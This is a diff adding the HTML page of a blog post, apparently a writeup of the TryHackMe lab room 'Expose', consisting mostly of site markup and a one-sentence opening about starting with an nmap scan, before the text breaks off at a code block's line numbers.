@@ -1,0 +1,1028 @@
+<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="My writeup of the TryHackMe room [Expose](https://tryhackme.com/room/expose)"><title>Expose Writeup THM</title>
+<link rel=canonical href=https://simonefelici.github.io/p/expose-writeup-thm/><link rel=stylesheet href=/scss/style.min.c8f64c33a48a4107c329f15f7a52b75fbb7d8554acda02f387bb0e1975008604.css><meta property='og:title' content="Expose Writeup THM"><meta property='og:description' content="My writeup of the TryHackMe room [Expose](https://tryhackme.com/room/expose)"><meta property='og:url' content='https://simonefelici.github.io/p/expose-writeup-thm/'><meta property='og:site_name' content='0000FF'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='Linux'><meta property='article:tag' content='Privilege Escalation'><meta property='article:published_time' content='2024-01-28T15:00:00+00:00'><meta property='article:modified_time' content='2024-01-28T15:00:00+00:00'><meta property='og:image' content='https://raw.githubusercontent.com/SimoneFelici/Expose-writeup-THM/main/4ca36771-eb73-4388-a0ae-5541d4fc580b_Export-7a75593e-3439-4e58-bca6-e041ad0479ff/Expose%208862d9d2d64c447b9983bf0fafb7c8f6/Untitled.png'><meta name=twitter:title content="Expose Writeup THM"><meta name=twitter:description content="My writeup of the TryHackMe room [Expose](https://tryhackme.com/room/expose)"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content='https://raw.githubusercontent.com/SimoneFelici/Expose-writeup-THM/main/4ca36771-eb73-4388-a0ae-5541d4fc580b_Export-7a75593e-3439-4e58-bca6-e041ad0479ff/Expose%208862d9d2d64c447b9983bf0fafb7c8f6/Untitled.png'><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu_2be7ac61fd840a54.png width=300 height=300 class=site-logo loading=lazy alt=Avatar>
+</a><span class=emoji>🔥</span></figure><div class=site-meta><h1 class=site-name><a href=/>0000FF</a></h1><h2 class=site-description>🖋️ PenTester<br>👾 CTF player<br>💻 42 student</h2></div></header><ol class=menu-social><li><a href=https://github.com/SimoneFelici target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://tryhackme.com/p/SimoneF9 target=_blank title=TryHackMe rel=me><svg xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:svgjs="http://svgjs.dev/svgjs" width="552" height="564" viewBox="0 0 552 564"><image width="552" height="564" xlink:href="data:image/png;base64,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"/><style>@media(prefers-color-scheme:light){:root{filter:none}}@media(prefers-color-scheme:dark){:root{filter:none}}</style></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li><a href=/whoami/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>whoami</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>Dark Mode</span></li></ol></li></ol></aside><main class="main full-width"><article class="has-image main-article"><header class=article-header><div class=article-image><a href=/p/expose-writeup-thm/><img src=https://raw.githubusercontent.com/SimoneFelici/Expose-writeup-THM/main/4ca36771-eb73-4388-a0ae-5541d4fc580b_Export-7a75593e-3439-4e58-bca6-e041ad0479ff/Expose%208862d9d2d64c447b9983bf0fafb7c8f6/Untitled.png loading=lazy alt="Featured image of post Expose Writeup THM"></a></div><div class=article-details><header class=article-category><a href=/categories/room/>Room
+</a><a href=/categories/easy/ style=background-color:#2ecc71;color:#fff>Easy</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/expose-writeup-thm/>Expose Writeup THM</a></h2><h3 class=article-subtitle>My writeup of the TryHackMe room <a class=link href=https://tryhackme.com/room/expose target=_blank rel=noopener>Expose</a></h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published>Jan 28, 2024</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>17 minute read</time></div></footer></div></header><section class=article-content><p>First of all I am going to start with an nmap scan:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
